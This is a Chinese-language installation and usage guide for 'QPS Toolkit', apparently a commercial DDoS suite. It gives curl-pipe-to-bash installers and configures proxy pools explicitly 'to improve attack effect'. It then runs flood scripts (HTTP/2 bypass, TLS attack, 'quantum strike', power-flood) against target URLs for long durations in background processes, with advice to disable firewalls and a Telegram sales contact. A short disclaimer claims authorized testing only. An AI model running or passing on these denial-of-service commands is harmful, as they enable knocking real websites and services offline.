# 🚀 QPS Toolkit 一键安装指南

完整的系统配置和安装教程，适合新手和专业用户。

---

## 📋 系统要求

### 推荐系统

| 系统 | 版本 | 状态 |
|------|------|------|
| **Ubuntu** | 22.04 LTS / 20.04 LTS | ✅ 强烈推荐 |
| **CentOS** | 7.6+ / 8+ | ✅ 推荐 |
| **Debian** | 11+ | ✅ 支持 |
| **RHEL** | 8+ | ✅ 支持 |

### 软件版本要求

| 软件 | 版本 | 说明 |
|------|------|------|
| **Node.js** | 20.19.5+ | 必需 |
| **npm** | 10.0+ | 必需 |
| **Git** | 2.30+ | 必需 |
| **nvm** | 0.39+ | 推荐 |

### 硬件要求

| 配置 | 最低 | 推荐 |
|------|------|------|
| **CPU** | 2 核心 | 4+ 核心 |
| **内存** | 4 GB | 8+ GB |
| **硬盘** | 20 GB | 50+ GB |
| **带宽** | 10 Mbps | 100+ Mbps |

---

## 🎯 一键安装脚本

### Ubuntu 22.04 / 20.04

复制以下命令，**一键完成所有安装**：

```bash
# 一键安装所有依赖 + QPS Toolkit（Ubuntu）
curl -fsSL https://raw.githubusercontent.com/DdosLiYunLong/qps-toolkit-release/main/install-ubuntu.sh | bash
```

<details>
<summary>📝 点击查看详细命令（如果一键脚本不可用）</summary>

```bash
# 1. 更新系统
sudo apt update && sudo apt upgrade -y

# 2. 安装基础工具
sudo apt install -y curl wget git build-essential

# 3. 安装 NVM（Node 版本管理器）
curl -o- https://raw.githubusercontent.com/nvm-sh/nvm/v0.39.7/install.sh | bash

# 4. 加载 NVM
export NVM_DIR="$HOME/.nvm"
[ -s "$NVM_DIR/nvm.sh" ] && \. "$NVM_DIR/nvm.sh"

# 5. 安装 Node.js 20.19.5
nvm install 20.19.5
nvm use 20.19.5
nvm alias default 20.19.5

# 6. 验证安装
node --version  # 应该显示 v20.19.5
npm --version   # 应该显示 10.x

# 7. 克隆 QPS Toolkit
git clone https://github.com/DdosLiYunLong/qps-toolkit-release.git
cd qps-toolkit-release

# 8. 安装依赖
npm install

# 9. 完成！测试运行
node scripts/analyzer-tools/protocol-analyzer --help
```

</details>

---

### CentOS 7.6+ / 8+

复制以下命令，**一键完成所有安装**：

```bash
# 一键安装所有依赖 + QPS Toolkit（CentOS）
curl -fsSL https://raw.githubusercontent.com/DdosLiYunLong/qps-toolkit-release/main/install-centos.sh | bash
```

<details>
<summary>📝 点击查看详细命令（如果一键脚本不可用）</summary>

```bash
# 1. 更新系统
sudo yum update -y

# 2. 安装基础工具
sudo yum install -y curl wget git gcc-c++ make

# 3. 安装 NVM（Node 版本管理器）
curl -o- https://raw.githubusercontent.com/nvm-sh/nvm/v0.39.7/install.sh | bash

# 4. 加载 NVM
export NVM_DIR="$HOME/.nvm"
[ -s "$NVM_DIR/nvm.sh" ] && \. "$NVM_DIR/nvm.sh"

# 5. 安装 Node.js 20.19.5
nvm install 20.19.5
nvm use 20.19.5
nvm alias default 20.19.5

# 6. 验证安装
node --version  # 应该显示 v20.19.5
npm --version   # 应该显示 10.x

# 7. 克隆 QPS Toolkit
git clone https://github.com/DdosLiYunLong/qps-toolkit-release.git
cd qps-toolkit-release

# 8. 安装依赖
npm install

# 9. 完成！测试运行
node scripts/analyzer-tools/protocol-analyzer --help
```

</details>

---

## 🔧 手动安装（分步详解）

如果一键脚本失败，可以按照以下步骤手动安装：

### 步骤 1：安装 Git

<details>
<summary>Ubuntu / Debian</summary>

```bash
sudo apt update
sudo apt install -y git
git --version
```

</details>

<details>
<summary>CentOS / RHEL</summary>

```bash
sudo yum install -y git
git --version
```

</details>

### 步骤 2：安装 NVM（Node 版本管理器）

```bash
# 下载并安装 NVM
curl -o- https://raw.githubusercontent.com/nvm-sh/nvm/v0.39.7/install.sh | bash

# 方法 1：重新加载终端配置
source ~/.bashrc

# 方法 2：如果上面不起作用，手动加载 NVM
export NVM_DIR="$HOME/.nvm"
[ -s "$NVM_DIR/nvm.sh" ] && \. "$NVM_DIR/nvm.sh"

# 验证 NVM 安装
nvm --version
```

### 步骤 3：安装 Node.js 20.19.5

```bash
# 安装 Node.js 20.19.5
nvm install 20.19.5

# 设置为默认版本
nvm use 20.19.5
nvm alias default 20.19.5

# 验证安装
node --version  # v20.19.5
npm --version   # 10.x
```

### 步骤 4：克隆 QPS Toolkit

```bash
# 克隆仓库
git clone https://github.com/DdosLiYunLong/qps-toolkit-release.git

# 进入目录
cd qps-toolkit-release

# 查看项目结构
ls -la
```

### 步骤 5：安装依赖

```bash
# 安装所有 Node.js 依赖
npm install

# 等待安装完成...
```

### 步骤 6：验证安装

```bash
# 测试协议分析器
node scripts/analyzer-tools/protocol-analyzer --help

# 测试推荐脚本
ls scripts/recommended/

# 查看文档
cat README.md
```

---

## 🎨 配置代理池

安装完成后，配置代理池以提高攻击效果：

```bash
# 1. 进入代理配置目录
cd config/proxies/

# 2. 查看可用代理池
ls -la

# 输出：
# asia.txt     - 亚洲代理池（1000+ IP）
# cn.txt       - 中国代理池（800+ IP）
# eu.txt       - 欧洲代理池（1200+ IP）
# global.txt   - 全球代理池（5000+ IP）
# us.txt       - 美国代理池（1500+ IP）

# 3. 编辑代理文件（可选）
nano global.txt

# 格式：IP:端口 或 用户名:密码@IP:端口
# 示例：
# 1.2.3.4:8080
# user:pass@5.6.7.8:3128
```

---

## 🚀 快速开始

安装完成后，立即开始使用：

### 1️⃣ 协议分析

智能分析目标并推荐最佳攻击方案：

```bash
node scripts/analyzer-tools/protocol-analyzer https://target.com
```

### 2️⃣ HTTP/2 绕过攻击

```bash
node scripts/recommended/http2-bypass.js \
  --url https://target.com \
  --proxy config/proxies/global.txt \
  --duration 300 \
  --processes 4 \
  --verify
```

### 3️⃣ 量子引擎攻击

```bash
./scripts/recommended/quantum-strike \
  --target https://target.com \
  --mode quantum \
  --proxies config/proxies/us.txt \
  --time 600
```

### 4️⃣ 超核攻击

```bash
node scripts/recommended/hyper-core.js \
  --url https://target.com \
  --proxy config/proxies/global.txt \
  --duration 300 \
  --workers 125
```

### 5️⃣ TLS 攻击

```bash
node scripts/recommended/tls-attack.js \
  --target https://target.com \
  --proxies config/proxies/global.txt \
  --duration 300 \
  --threads 50
```

---

## 🔍 常见问题

### ❓ NVM 命令找不到

**问题**：`nvm: command not found`

**解决**：

```bash
# 手动加载 NVM
export NVM_DIR="$HOME/.nvm"
[ -s "$NVM_DIR/nvm.sh" ] && \. "$NVM_DIR/nvm.sh"

# 或重新打开终端
```

### ❓ Node 版本错误

**问题**：`Node.js version mismatch`

**解决**：

```bash
# 检查当前版本
node --version

# 切换到正确版本
nvm use 20.19.5

# 设置为默认
nvm alias default 20.19.5
```

### ❓ npm install 失败

**问题**：`npm install` 报错

**解决**：

```bash
# 清理缓存
npm cache clean --force

# 删除 node_modules 和 package-lock.json
rm -rf node_modules package-lock.json

# 重新安装
npm install
```

### ❓ 授权验证失败

**问题**：`授权验证失败: Cannot find module '../../auth-system/client/auth-client.js'`

**解决**：这是旧版本问题，请更新到最新版本：

```bash
cd qps-toolkit-release
git pull origin main
npm install
```

### ❓ 代理无法连接

**问题**：代理文件配置错误

**解决**：

```bash
# 验证代理格式
cat config/proxies/global.txt | head -5

# 测试单个代理
curl -x http://1.2.3.4:8080 https://www.google.com

# 使用内置代理验证
node scripts/recommended/http2-bypass.js --verify
```

---

## 📊 系统优化（可选）

### 提升系统性能

```bash
# 1. 提高文件描述符限制
ulimit -n 65535

# 2. 优化网络参数
sudo sysctl -w net.ipv4.tcp_fin_timeout=30
sudo sysctl -w net.ipv4.tcp_tw_reuse=1
sudo sysctl -w net.core.somaxconn=65535

# 3. 禁用防火墙（测试环境）
sudo systemctl stop firewalld  # CentOS
sudo ufw disable               # Ubuntu
```

### 永久配置

```bash
# 编辑 limits.conf
sudo nano /etc/security/limits.conf

# 添加：
* soft nofile 65535
* hard nofile 65535

# 编辑 sysctl.conf
sudo nano /etc/sysctl.conf

# 添加：
net.ipv4.tcp_fin_timeout=30
net.ipv4.tcp_tw_reuse=1
net.core.somaxconn=65535

# 应用更改
sudo sysctl -p
```

---

## 🎓 进阶使用

### 多进程模式

```bash
# 使用 4 个进程（推荐）
node scripts/recommended/power-flood.js \
  --url https://target.com \
  --proxy config/proxies/global.txt \
  --duration 300 \
  --processes 4
```

### 后台运行

```bash
# 使用 nohup
nohup node scripts/recommended/http2-bypass.js \
  --url https://target.com \
  --proxy config/proxies/global.txt \
  --duration 3600 > attack.log 2>&1 &

# 查看日志
tail -f attack.log
```

### 使用 PM2 管理

```bash
# 安装 PM2
npm install -g pm2

# 启动脚本
pm2 start scripts/recommended/http2-bypass.js --name "attack" -- \
  --url https://target.com \
  --proxy config/proxies/global.txt \
  --duration 3600

# 查看状态
pm2 status

# 查看日志
pm2 logs attack

# 停止
pm2 stop attack
```

---

## 🆘 技术支持

### 联系方式

- **Telegram**: @jobliyunlong
- **响应时间**: 5 分钟内
- **支持语言**: 中文、English

### 获取帮助

1. **查看文档**：`cat README.md`
2. **脚本索引**：`cat scripts/INDEX.md`
3. **快速开始**：`cat scripts/premium-ddos/QUICKSTART.txt`

### 报告问题

如果遇到问题，请提供：
1. 系统版本：`uname -a`
2. Node 版本：`node --version`
3. npm 版本：`npm --version`
4. 错误信息：完整的错误日志

---

## 📖 相关文档

- 📘 [README.md](README.md) - 项目概览
- 📙 [脚本索引](scripts/INDEX.md) - 所有脚本说明
- 📗 [快速开始](scripts/premium-ddos/QUICKSTART.txt) - 量子引擎指南
- 📕 [仓库管理](REPOSITORY-GUIDE.md) - 开发者指南

---

## ⚠️ 免责声明

本工具仅用于：
- ✅ 授权的安全测试
- ✅ 压力测试和性能评估
- ✅ 安全研究和学习

**严禁用于：**
- ❌ 未经授权的攻击行为
- ❌ 任何非法用途
- ❌ 违反当地法律法规的行为

使用者需遵守当地法律法规，因非法使用造成的一切后果由使用者自行承担。

---

## 🎉 安装完成！

现在您已经完成了所有安装步骤，可以开始使用 QPS Toolkit 了！

### 下一步

1. 📖 阅读文档：`cat README.md`
2. 🧪 测试脚本：`node scripts/analyzer-tools/protocol-analyzer --help`
3. 🚀 开始攻击：选择合适的脚本

**祝您使用愉快！** 🎊

---

**© 2025 QUANTUM STRIKE PRO**  
_Professional Quantum-Level Stress Testing Suite_

